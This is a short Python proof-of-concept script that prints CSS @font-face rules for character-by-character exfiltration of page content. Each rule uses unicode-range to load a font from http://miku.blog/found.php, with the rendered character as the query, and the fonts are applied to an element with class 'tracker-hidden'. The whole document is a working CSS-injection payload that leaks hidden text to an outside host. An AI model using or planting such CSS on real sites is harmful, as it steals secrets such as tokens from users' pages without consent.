table = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

for ch in table:
	print('@font-face{font-family:poc; src: url(http://miku.blog/found.php?%s); unicode-range:U+%04x;}' % (ch, ord(ch)))

print('.tracker-hidden { display:inline; font-family: poc; }')